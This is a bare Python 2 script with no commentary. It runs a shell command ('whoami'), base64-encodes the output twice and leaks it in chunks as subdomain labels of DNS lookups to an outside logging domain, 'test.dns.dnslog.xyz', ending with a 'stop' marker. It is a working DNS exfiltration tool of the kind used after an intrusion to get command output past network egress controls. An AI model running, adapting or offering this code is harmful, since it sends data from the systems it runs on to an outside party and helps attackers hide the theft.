import base64,socket,re,random,string,os
def cut_text(text,lenth):
    textArr=re.findall('.{'+str(lenth)+'}',text)
    textArr.append(text[(len(textArr)*lenth):])
    return textArr
domain='test.dns.dnslog.xyz'
cmd='whoami'
_os='l2'
result=os.popen(cmd).read()
b64cmd=base64.b64encode(base64.b64encode(result)).replace('=','')
b64cmd_list=cut_text(b64cmd,63)
rand_str=''.join(random.sample(string.ascii_letters,6))
count=0
for i in b64cmd_list:
    b64domain='%s.%s.%d.%s.%s'%(rand_str,_os,count,i,domain)
    try:
        socket.gethostbyname(b64domain)
    except:
        pass
    count+=1
b64domain='%s.%s.%d.%s.%s'%(rand_str+'stop',_os,count,'stop',domain)
try:
    socket.gethostbyname(b64domain)
except:
    pass
